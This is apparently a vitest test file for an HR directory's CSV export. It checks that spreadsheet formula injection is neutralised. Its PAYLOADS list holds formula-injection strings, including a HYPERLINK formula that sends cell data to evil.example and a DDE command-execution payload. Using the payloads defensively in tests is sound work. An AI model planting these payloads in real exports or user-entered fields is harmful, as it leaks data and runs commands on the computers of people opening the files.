import { describe, expect, it } from 'vitest';
import { directoryCsv } from '../server/csv.js';
import type { EmployeeRow } from '../shared/types.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

function employee(overrides: Partial<EmployeeRow> = {}): EmployeeRow {
  return {
    id: 1,
    name: 'Ada Lovelace',
    email: 'ada@example.com',
    job_title: 'Engineer',
    department_id: 1,
    department_name: 'Engineering',
    department_code: 'ENG',
    manager_id: null,
    manager_name: null,
    phone: '+49 30 123',
    location: 'Berlin',
    start_date: '2026-01-05',
    status: 'active',
    offboarded_at: null,
    created_at: '2026-01-05T09:00:00Z',
    direct_reports: 0,
    ...overrides,
  } as EmployeeRow;
}

describe('directory CSV export neutralizes spreadsheet formulas', () => {
  // Every one of these is a field an HR user types by hand.
  it.each(PAYLOADS)('defuses %o in the employee name', (payload) => {
    expectDefused(directoryCsv([employee({ name: payload })]), payload);
  });

  it.each(['job_title', 'location', 'phone', 'manager_name'] as const)('defuses a formula in %s', (field) => {
    expectDefused(directoryCsv([employee({ [field]: '=1+1' } as Partial<EmployeeRow>)]), '=1+1');
  });

  it('leaves ordinary values alone', () => {
    const cells = cellsOf(directoryCsv([employee({ name: 'Ford, "Prefect"' })]));
    expect(cells).toContain('Ford, "Prefect"');
    expect(cells).toContain('ada@example.com');
  });
});
